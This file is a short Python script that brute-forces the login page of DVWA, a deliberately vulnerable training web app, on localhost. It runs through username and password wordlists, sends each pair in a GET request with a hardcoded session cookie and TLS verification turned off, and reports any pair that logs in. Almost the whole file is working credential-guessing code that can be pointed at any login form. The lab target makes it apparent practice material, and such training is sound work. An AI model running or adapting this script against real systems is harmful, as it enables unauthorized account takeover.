import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://127.0.0.1/dvwa/vulnerabilities/brute/"
cookies = dict(security='low', PHPSESSID="t1kqiierd4f8fbrl83aveplg6h")
over = False
count = 0
with open(r'common_usr.txt', 'r') as names:
    for name in names:
        with open(r'common_pass.txt', 'r') as passwords:
            for password in passwords:
                api_url = f'{url}?username={name.strip()}&password={password.strip()}&Login=Login#'
                print('-'*20)
                print('Username:', name.strip())
                print('Password', password.strip())
                response = requests.get(url=api_url, cookies=cookies, verify=False)

                count = count + 1

                if 'Username and/or password incorrect.' in response.text:
                    print("\033[31m"+"Crack failed!"+"\033[0m")
                else:
                    print("\033[32m"+"Crack sucessed!"+"\033[0m")
                    over = True
                    break
        if over == True:
            break
print('-'*20)
print(f"\033[34mAttempt {count} times in total.")